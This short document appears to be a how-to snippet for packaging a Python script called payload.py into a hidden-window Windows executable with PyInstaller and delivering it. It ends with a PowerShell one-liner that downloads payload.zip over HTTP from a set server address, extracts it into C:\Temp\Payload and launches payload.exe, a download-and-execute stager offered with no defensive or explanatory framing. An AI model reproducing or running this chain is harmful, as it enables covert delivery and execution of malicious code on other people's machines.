Prerequisites (Install PyInstaller)
```bash
pip install pyinstaller requests
```

Compile the Script
```bash
pyinstaller --onefile --windowed payload.py
```

Example ps one-liner
```powershell
$ServerIP="192.168.1.100"; $Port=80; $ZipFile="payload.zip"; $BinaryFile="payload.exe"; $TargetDir="C:\Temp\Payload"; Invoke-WebRequest -Uri "http://$ServerIP:$Port/$ZipFile" -OutFile $ZipFile; Expand-Archive -Path $ZipFile -DestinationPath $TargetDir -Force; Start-Process -FilePath "$TargetDir\$BinaryFile"
```